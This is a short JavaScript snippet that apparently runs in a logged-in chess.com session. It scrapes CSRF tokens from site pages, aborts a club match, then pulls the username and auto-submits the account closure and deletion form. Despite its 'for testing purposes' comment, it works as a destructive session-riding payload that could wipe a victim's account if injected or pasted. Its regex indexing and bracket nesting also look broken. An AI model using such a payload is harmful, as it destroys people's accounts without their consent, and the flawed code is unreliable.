// cancel match first before deleting account, for testing purposes
fetch("https://www.chess.com/club/matches/1319583").then((response) => response.text())
    .then((text) => {
            var token = text.match(/("token":".+?)["]/)[1].substr(9);
            fetch("https://www.chess.com/club/matches/abort/1319583", {
                    "headers": {
                        "content-type": "application/x-www-form-urlencoded",
                    },
                    "body": "_token=" + token,
                    "method": "POST",
                }).then(response => {
                        fetch("https://www.chess.com/my-data").then((response) => response.text())
                            .then((text) => {
                                    var token = text.match(/(form-error-clear="" value=".+?)["]/)[2].substr(27);
                                    console.log(token);
                                    fetch("https://www.chess.com/settings").then((response) => response.text())
                                        .then((text) => {
                                                var username = text.match(/("username":".+?)["]/)[1].substr(12);console.log(username);
                                     fetch("https://www.chess.com/my-data", {
                    "headers": {
                        "content-type": "application/x-www-form-urlencoded",
                    },
                    "body": "my_data_account_closure_and_deletion[_token]=" + token + "&my_data_account_closure_and_deletion[username]=" + username + "&my_data_account_closure_and_deletion[save]",
                    "method": "POST",
                })
                                    })})});
                                                });
